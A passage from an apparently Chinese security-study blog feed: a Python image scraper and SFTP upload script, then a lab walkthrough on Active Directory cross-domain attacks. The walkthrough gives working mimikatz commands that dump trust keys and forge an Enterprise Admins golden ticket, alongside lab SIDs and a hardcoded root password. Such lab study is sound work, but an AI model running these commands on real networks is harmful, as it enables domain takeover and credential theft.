href="https://proxyscrape.com/free-proxy-list">https://proxyscrape.com/free-proxy-list</a></p><p>zip函数，将两个列表组合</p><p><img src="/img/image-20231115111910958.png" alt="image-20231115111910958"> </p><ul><li>翻页url</li></ul><p><img src="/img/image-20231115114145578.png" alt="image-20231115114145578"></p><p>抓取属性为next的a标签中的href属性然后拼接即可</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">result</span> = html.xpath(<span class="hljs-string">&#x27;//a[<span class="hljs-variable">@class</span>=&quot;next&quot;]/<span class="hljs-variable">@href</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="整体代码"><a href="#整体代码" class="headerlink" title="整体代码"></a>整体代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> fake_useragent <span class="hljs-keyword">import</span> UserAgent    <span class="hljs-comment">#使用随机UA</span><br><span class="hljs-keyword">import</span> os<br><br>ua = UserAgent()<br>logging.basicConfig(level=logging.INFO,<br>                    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s : %(message)s&#x27;</span>)<br><br>url = <span class="hljs-string">&quot;https://www.4399dmw.com/search/dh-1-0-0-0-0-0-0/&quot;</span><br>filepath = <span class="hljs-string">&quot;E:\\secStudy\\pythonProject\\xpath\\http_proxies.txt&quot;</span><br><br><span class="hljs-comment">#读取代理列表</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_proxy_file</span>(<span class="hljs-params">filepath</span>):<br>    proxy_list = []<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>                line.strip()<br>                <span class="hljs-keyword">if</span> line:<br>                    proxy_list.append(line.strip())<br>    <span class="hljs-keyword">except</span> FileExistsError:<br>        logging.error(<span class="hljs-string">&quot;文件未找到&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logging.error(<span class="hljs-string">f&quot;发生错误:<span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>    <span class="hljs-comment">#print(proxy_list)</span><br>    <span class="hljs-keyword">return</span> proxy_list<br><br><span class="hljs-comment">#从代理列表中随机取一个代理</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_proxy</span>():<br>    proxy = random.choice(read_proxy_file(filepath))<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;http&quot;</span>:proxy&#125;<br><br><span class="hljs-comment">#通过链接保存图片</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_image</span>(<span class="hljs-params">img_url,img_name</span>):<br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:ua.random,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;UM_distinctid=18b703032a8f0b-02226ea1833d6e-26031151-384000-18b703032a91af9; Hm_lvt_6bed68d13e86775334dd3a113f40a535=1698394289; a_180_90_index=1; CNZZDATA3217746=cnzz_eid%3D663098020-1698394289-%26ntime%3D1698394702; Hm_lpvt_6bed68d13e86775334dd3a113f40a535=1698394702; a_980_90_index=1; a_200_90_index=5&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>:<span class="hljs-string">&quot;https://www.4399dmw.com/donghua/&quot;</span><br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        img = requests.get(url=img_url,headers=headers)<br>        image_name = img_name + <span class="hljs-string">&#x27;.jpg&#x27;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(image_name,<span class="hljs-string">&#x27;ab&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(img.content)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        logging.error(e)<br><br><span class="hljs-comment">#指定图片文件存储路径</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mk_dir</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-comment">#判断目录是否存在</span><br>    <span class="hljs-comment">#os.path.exists判断是否存在路径</span><br>    <span class="hljs-comment">#os.path.join链接路径和文件名</span><br>    is_exist = os.path.exists(os.path.join(<span class="hljs-string">&quot;E:\\secStudy\\pythonProject\\xpath\\image_dir&quot;</span>,path))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_exist:<br>        <span class="hljs-comment">#创建文件夹</span><br>        os.mkdir(os.path.join(<span class="hljs-string">&quot;E:\\secStudy\\pythonProject\\xpath\\image_dir&quot;</span>,path))<br>        os.chdir(os.path.join(<span class="hljs-string">&quot;E:\\secStudy\\pythonProject\\xpath\\image_dir&quot;</span>,path))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">else</span>:<br>        os.chdir(os.path.join(<span class="hljs-string">&quot;E:\\secStudy\\pythonProject\\xpath\\image_dir&quot;</span>,path))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span> <br>    <br><span class="hljs-comment">#获取下一页链接</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">next_page</span>(<span class="hljs-params">html</span>):<br>    next_url = html.xpath(<span class="hljs-string">&#x27;//a[@class=&quot;next&quot;]/@href&#x27;</span>)<br>    <span class="hljs-comment">#拼接</span><br>    <span class="hljs-keyword">if</span> next_url:<br>        next_url = <span class="hljs-string">&#x27;https://www.4399dmw.com/&#x27;</span> + next_url[<span class="hljs-number">0</span>]<br>    <span class="hljs-comment"># print(next_url)</span><br>        <span class="hljs-keyword">return</span> next_url<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <br><span class="hljs-comment">#总的爬取函数</span><br><br><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">spider_4399dmw</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment">#图片的xpath</span><br>    <span class="hljs-comment">#result = html.xpath(&#x27;//div[@class=&quot;lst&quot;]/a[@class=&quot;u-card&quot;]/img/@data-src&#x27;)</span><br>    <span class="hljs-comment">#标题的xpath</span><br>    <span class="hljs-comment">#result = html.xpath(&#x27;//div[@class=&quot;lst&quot;]/a[@class=&quot;u-card&quot;]/div[@class=&quot;u-ct&quot;]/p[@class=&quot;u-tt&quot;]/text()&#x27;)</span><br>    headers = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:ua.random,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;UM_distinctid=18b703032a8f0b-02226ea1833d6e-26031151-384000-18b703032a91af9; Hm_lvt_6bed68d13e86775334dd3a113f40a535=1698394289; a_180_90_index=1; CNZZDATA3217746=cnzz_eid%3D663098020-1698394289-%26ntime%3D1698394702; Hm_lpvt_6bed68d13e86775334dd3a113f40a535=1698394702; a_980_90_index=1; a_200_90_index=5&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>:<span class="hljs-string">&quot;https://www.4399dmw.com/donghua/&quot;</span><br>    &#125;<br>    <span class="hljs-comment">#代理</span><br><br>    logging.info(<span class="hljs-string">&quot;开始爬取：&quot;</span>+url)<br>    resp = requests.get(url=url,headers=headers)<br>    <span class="hljs-comment">#print(resp.status_code)</span><br>    <span class="hljs-comment">#print(resp.text)</span><br>    html_text = resp.content.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    html = etree.HTML(html_text)    <span class="hljs-comment">#解析为html对象</span><br>    <span class="hljs-comment">#获取当前页码</span><br>    page = html.xpath(<span class="hljs-string">&#x27;//span[@class=&quot;cur&quot;]/text()&#x27;</span>)<br>    <span class="hljs-comment">#创建页码对应的图片文件夹</span><br>    mk_dir(<span class="hljs-string">&quot;第&quot;</span>+page[<span class="hljs-number">0</span>]+<span class="hljs-string">&quot;页&quot;</span>)<br>    <span class="hljs-comment">#title的xpath</span><br>    title = html.xpath(<span class="hljs-string">&#x27;//div[@class=&quot;lst&quot;]/a[@class=&quot;u-card&quot;]/div[@class=&quot;u-ct&quot;]/p[@class=&quot;u-tt&quot;]/text()&#x27;</span>)<br>    <span class="hljs-comment">#img的xpath</span><br>    image_src = html.xpath(<span class="hljs-string">&#x27;//div[@class=&quot;lst&quot;]/a[@class=&quot;u-card&quot;]/img/@data-src&#x27;</span>)<br>    <span class="hljs-comment"># print(title)</span><br>    <span class="hljs-comment"># print(image_src)</span><br>    <span class="hljs-comment">#在链接前拼接http</span><br>    image_url = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> image_src:<br>        image_url.append(<span class="hljs-string">&#x27;http:&#x27;</span>+i)<br>    <span class="hljs-comment">#print(image_url)</span><br>    <span class="hljs-comment">#保存图片</span><br>    <span class="hljs-comment">#1.请求图片的url  2.将请求的内容保存为图片</span><br>    <span class="hljs-keyword">for</span> nurl,ntitle <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(image_url,title):<br>        save_image(nurl,ntitle)<br>    <span class="hljs-comment">#如果存在下一页，则递归调用函数爬取下一页图片</span><br>    <span class="hljs-keyword">if</span> next_page(html=html):<br>        spider_4399dmw(next_page(html))<br>    <span class="hljs-keyword">else</span>:<br>        logging.warning(<span class="hljs-string">&quot;无法找到下一页，已完成所有爬取！&quot;</span>)<br>    <br><br>spider_4399dmw(url)<br><span class="hljs-comment">#read_proxy_file(filepath)]</span><br><span class="hljs-comment">#logging.warning(get_proxy())</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231115150544471.png" alt="image-20231115150544471"></p><p><img src="/img/image-20231115150557127.png" alt="image-20231115150557127"> </p><h3 id="将本地文件存储到服务器上"><a href="#将本地文件存储到服务器上" class="headerlink" title="将本地文件存储到服务器上"></a>将本地文件存储到服务器上</h3><p>1.检查服务器上的路径（&#x2F;root&#x2F;spider_img）</p><p>2.使用sftp将文件发送上去</p><p>使用os.walk进行递归读取时注意，分为3个部分：文件夹路径、空列表、图片名称列表</p><p><img src="/img/image-20231115152605742.png" alt="image-20231115152605742"></p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> paramiko<br><br><span class="hljs-comment">#远程服务器连接信息</span><br>hostname = <span class="hljs-string">&#x27;10.210.100.148&#x27;</span><br>port = <span class="hljs-number">22</span><br>username = <span class="hljs-string">&#x27;root&#x27;</span><br>password = <span class="hljs-string">&#x27;123456&#x27;</span><br><br><span class="hljs-comment">#本地图片文件夹路径</span><br>local_image_folder = <span class="hljs-string">&#x27;E:\\secStudy\\pythonProject\\xpath\\image_dir&#x27;</span><br><span class="hljs-comment">#远程服务器上的目标路径</span><br>remote_target_path = <span class="hljs-string">&#x27;/root/spider_img/&#x27;</span><br><br><span class="hljs-comment">#检查远程服务器上的文件夹是否存在</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_remote_dir</span>(<span class="hljs-params">sftp,remote_folder</span>):<br>    <span class="hljs-comment">#1.检查远程路径是否存在，如果存在就进入路径</span><br>    <span class="hljs-comment">#2.如果不存在，则创建改路径</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment">#尝试进入该路径</span><br>        sftp.chdir(remote_folder)<br>    <span class="hljs-keyword">except</span> IOError:<br>        <span class="hljs-comment">#路径不存在，创建</span><br>        sftp.mkdir(remote_folder)<br>        sftp.chdir(remote_folder)<br><br><span class="hljs-comment">#传送图片上去</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_images</span>(<span class="hljs-params">local_folder,remote_folder,ssh_client</span>):<br>    <span class="hljs-comment">#打开sftp</span><br>    <span class="hljs-keyword">with</span> ssh_client.open_sftp() <span class="hljs-keyword">as</span> sftp:<br>        <span class="hljs-comment">#创建或者进入远程文件路径来确保路径正确</span><br>        check_remote_dir(sftp,remote_folder)<br>        <span class="hljs-comment">#递归遍历本地文件夹</span><br>        <span class="hljs-keyword">for</span> root, _,files <span class="hljs-keyword">in</span> os.walk(local_image_folder):<br>            <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> files:<br>                <span class="hljs-comment">#本地单个文件路径</span><br>                local_filepath = os.path.join(root,filename)<br>                <span class="hljs-comment">#服务器单个文件路径</span><br>                remote_filepath = os.path.join(remote_folder,filename)<br><br>                <span class="hljs-comment">#输出上传信息，包括本地文件路径和远程文件路径</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;uploaded:<span class="hljs-subst">&#123;local_filepath&#125;</span> to <span class="hljs-subst">&#123;remote_filepath&#125;</span>&#x27;</span>)<br>                <span class="hljs-comment">#上传文件</span><br>                sftp.put(local_filepath,remote_filepath)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-comment">#建立ssh连接</span><br>    ssh_client = paramiko.SSHClient()<br>    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())<span class="hljs-comment"># 设置自动添加远程主机密钥策略</span><br>    ssh_client.connect(hostname,port,username,password)<br>    upload_images(local_image_folder,remote_target_path,ssh_client)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;All images successfully uploaded to <span class="hljs-subst">&#123;hostname&#125;</span>:<span class="hljs-subst">&#123;remote_target_path&#125;</span>&#x27;</span>)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Error:<span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-keyword">finally</span>:<br>    ssh_client.close()  <span class="hljs-comment">#最终关闭ssh连接</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231115153011023.png" alt="image-20231115153011023"></p><p><img src="/../../../%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/md%E6%96%87%E4%BB%B6%E5%9B%BE%E7%89%87%E5%AD%98%E6%94%BE/image-20231115152835896.png" alt="image-20231115152835896"></p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网-跨域攻击</title>
    <link href="/2023/11/03/%E5%86%85%E7%BD%91-%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/"/>
    <url>/2023/11/03/%E5%86%85%E7%BD%91-%E8%B7%A8%E5%9F%9F%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="跨域攻击"><a href="#跨域攻击" class="headerlink" title="跨域攻击"></a>跨域攻击</h1><h2 id="1-跨域攻击介绍"><a href="#1-跨域攻击介绍" class="headerlink" title="1.跨域攻击介绍"></a>1.跨域攻击介绍</h2><h3 id="内网中的域林"><a href="#内网中的域林" class="headerlink" title="内网中的域林"></a>内网中的域林</h3><p>很多大型企业都拥有自己的内网，一般通过域林进行共享资源。根据不同职能区分的部门，从逻辑上以 主域和子域进行区分，以方便统一管理。在物理层，通常使用防火墙将各个子公司及各个部门划分为不 同的区域。</p><img src="/img/image-20231025205850053.png" alt="image-20231025205850053" style="zoom: 67%;" /> <h3 id="跨域攻击方法"><a href="#跨域攻击方法" class="headerlink" title="跨域攻击方法"></a>跨域攻击方法</h3><p>1、常规渗透方法（利用web漏洞） </p><p>2、哈希传递票据攻击 </p><p>3、利用域信任关系</p><img src="/img/image-20231025210016134.png" alt="image-20231025210016134" style="zoom:67%;" /><h3 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h3><p>建立域之间的信任关系，是为了一个域的用户能方便地访问其他域的资源，同时也方便了对域网络的管 理和维护，域信任作为域中的一种机制，<strong>允许另一个域的用户在通过身份验证后访问本域中的资源</strong>。同 时，域信任利用DNS服务器定位两个不同子域的域控制器，如果两个域中的域控制器都无法找到另一个 域，也就不存在通过域信任关系进行跨域资源共享了</p><h3 id="域信任关系分类"><a href="#域信任关系分类" class="headerlink" title="域信任关系分类"></a>域信任关系分类</h3><p>域信任关系分为单向信任和双向信任 </p><p><strong>单向信任</strong>：是指在两个域之间创建单向的信任路径，即在一个方向上是信任流，在另一个方向上是访问 流，受信任域内的用户（或者计算机）可以访问信任域内的资源，但信任域内的用户无法访问受信任域 内的资源。也就是说，A域信任B域，那么B域内受信任的主体可以访问A域内信任B域的资源。 </p><p><strong>双向信任</strong>：是指两个单向信任的组合，信任域和受信任域彼此信任，在两个方向上都有信任流和访问 流。这意味着，可以从两个方向在两个域之间传递身份验证请求。活动目录中的所有信任关系都是双向 可传递的。在创建子域时，会在新的父域和子域之间自动创建双向可传递信任关系，从下级域发出的身 份验证请求可以通关其父域向上流向信任域</p><p>域信任关系也可以分为内部信任和外部信任</p><p><strong>内部信任</strong>：在默认情况下,<strong>用活动目录安装向导将新域添加到域树或林根域中，会自动创建双向可传递信 任</strong>。在现有林中创建域树时，将建立新的树根信任，当前域树中的两个或多个域之间的信任关系被称为 内部信任。这种信任关系是可传递的。例如，有三个子域BA,CA,DA,BA域信任CA域，CA域信任DA域， 则BA域也信任DA域</p><p>外部信任是指两个不同林中的域的信任关系。外部信任是不可传递的，而且是单向的。</p><p>只有domain admins组中的用户可以管理域信任关系</p><p><img src="/img/image-20231025210443394.png" alt="image-20231025210443394"></p><h2 id="2-搭建和查看域信任关系"><a href="#2-搭建和查看域信任关系" class="headerlink" title="2.搭建和查看域信任关系"></a>2.搭建和查看域信任关系</h2><h3 id="搭建域树（内部信任）"><a href="#搭建域树（内部信任）" class="headerlink" title="搭建域树（内部信任）"></a>搭建域树（内部信任）</h3><p>如果是复制的虚拟机请运行 C:\Windows\System32\sysprep\sysprep.exe 重新获取SID</p><p>1、修改计算机名和修改IP地址，DNS指向父域 </p><p><img src="/img/image-20231026094725086.png" alt="image-20231026094725086"></p><p><img src="/img/image-20231026094835010.png" alt="image-20231026094835010"></p><p>2、安装 AD域服务 </p><p>除了这里全都下一步 最后安装</p><p><img src="/img/image-20231026095136670.png" alt="image-20231026095136670"></p><p>3、升级为域控</p><p><img src="/img/image-20231026095455432.png" alt="image-20231026095455432"></p><p>4、添加到现有林    点击更改提供父域的账号密码</p><p><img src="/img/image-20231026095639902.png" alt="image-20231026095639902"></p><p>5、正常安装直到结束</p><p><img src="/img/image-20231026095922864.png" alt="image-20231026095922864"></p><p>6.pc-2008-2（10.210.100.144）加入子域</p><p><img src="/img/image-20231026102839696.png" alt="image-20231026102839696"> </p><p><img src="/img/image-20231026103215208.png" alt="image-20231026103215208"> </p><h3 id="搭建域森林（外部信任）（未搭建）"><a href="#搭建域森林（外部信任）（未搭建）" class="headerlink" title="搭建域森林（外部信任）（未搭建）"></a>搭建域森林（外部信任）（未搭建）</h3><p>1、修改计算机名和修改IP地址，DNS指向根域</p><p><img src="/img/image-20231026103430931.png" alt="image-20231026103430931"> </p><p>2、安装 AD域服务</p><p><img src="/img/image-20231026103438997.png" alt="image-20231026103438997"> </p><p>3、升级为域控</p><p><img src="/img/image-20231026103445557.png" alt="image-20231026103445557"> </p><p>4、添加到现有林</p><p><img src="/img/image-20231026103455152.png" alt="image-20231026103455152"> </p><p>5、正常安装即可</p><h3 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h3><p>在域中，<strong>Enterprise Admins组（出现在林中的根域中）的成员具有对目录林中所有域的完全控制权限</strong>。在默认情况下，该组包含林中所有域控制器上具有Administrators权限的成员</p><p>查看当前域中计算机的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span> /all<br></code></pre></td></tr></table></figure><p>使用lg工具获取域的相关信息 </p><p>查看域信任关系</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nltest /domain_trusts<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026104233107.png" alt="image-20231026104233107"> </p><p>获取当前域中的用户组</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang">LG.exe 域名\.<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026105125823.png" alt="image-20231026105125823"> </p><p><img src="/img/image-20231026105148997.png" alt="image-20231026105148997"> </p><p>获取远程机器的本地用户组</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">LG.<span class="hljs-keyword">exe</span> \\计算机名 -<span class="hljs-keyword">lu</span><br>LG.<span class="hljs-keyword">exe</span> \\DC -<span class="hljs-keyword">lu</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026105326339.png" alt="image-20231026105326339"> </p><p><img src="/img/image-20231026105529361.png" alt="image-20231026105529361"> </p><p>获取远程系统中的用户SID</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">LG.<span class="hljs-keyword">exe</span> \\计算机名 -<span class="hljs-keyword">lu</span> -sidsout<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026105708237.png" alt="image-20231026105708237"> </p><h2 id="3-利用域信任密钥获取目标域"><a href="#3-利用域信任密钥获取目标域" class="headerlink" title="3.利用域信任密钥获取目标域"></a>3.利用域信任密钥获取目标域</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><table><thead><tr><th>IP</th><th>所属域</th><th>域中地位</th><th>机器名</th><th>当前登录用户</th></tr></thead><tbody><tr><td>10.210.100.10</td><td>hack.com</td><td>根域的域控</td><td>DC</td><td>hack\administrator</td></tr><tr><td>10.210.100.150</td><td>abc.hack.com</td><td>子域域控</td><td>DC2</td><td>abc\administrator</td></tr><tr><td>10.210.100.144</td><td>abc.hack.com</td><td>子域中的机器</td><td>PC-2008-2</td><td>abc\liwei</td></tr></tbody></table><p>当前已经控制abc.hack.com域，其中包括 DC2机器和PC-2008-2机器</p><p><img src="/img/image-20231026110944699.png" alt="image-20231026110944699"> </p><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><p>1.发现有根域</p><p><img src="/img/image-20231026111429382.png" alt="image-20231026111429382"></p><p>2.当前无法访问DC.HACK.COM</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> \\dc.hack.com\c<span class="hljs-variable">$</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026111503517.png" alt="image-20231026111503517"> </p><p>3.使用mimikatz获取 <strong>当前域的 SID, 父域的 SID ,子域域管的NTLM ,信任密钥</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;lsadump::lsa /patch /user:HACK$&quot;</span> <span class="hljs-string">&quot;lsadump::trust /patch&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026111829628.png" alt="image-20231026111829628"></p><p><img src="/img/image-20231026111902847.png" alt="image-20231026111902847"> </p><p>子域sid：S-1-5-21-3991110149-857536787-685120577</p><p>父域sid：S-1-5-21-2431442348-1717482385-2017137259</p><p>信任密钥：8c5948ade6a77b4276a8710327ce83f3</p><p>4.在普通的域内用户中创建创建高权限票据</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:子域 /sid:子域SID /sids:父域sid-519 /rc4:信任密钥 /user:任意用户 /service:krbtgt /target:父域 /ticket:subdc_administrator.kirbi&quot;</span> <span class="hljs-keyword">exit</span><br>eg:kerberos::golden <span class="hljs-regexp">/domain:abc.hack.com /</span>sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3991110149</span>-<span class="hljs-number">857536787</span>-<span class="hljs-number">685120577</span> <span class="hljs-regexp">/sids:S-1-5-21-2431442348-1717482385-2017137259-519 /</span>rc4:<span class="hljs-number">8</span>c5948ade6a77b4276a8710327ce83f3 <span class="hljs-regexp">/user:administrator /</span>service:krbtgt <span class="hljs-regexp">/target:hack.com /</span>ticket:administrator.kirbi<br><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:abc.hack.com /sid:S-1-5-21-2902250016-280749999-3752131090 /sids:S-1-5-21-2716900768-72748719-3475352185-519 /rc4:4101a9a4410052f42a70990e5371a5b9 /user:administrator /service:krbtgt /target:hack.com /ticket:administrator.kirbi&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231026113125073.png" alt="image-20231026113125073"></p><p><img src="/img/image-20231026113203073.png" alt="image-20231026113203073"> 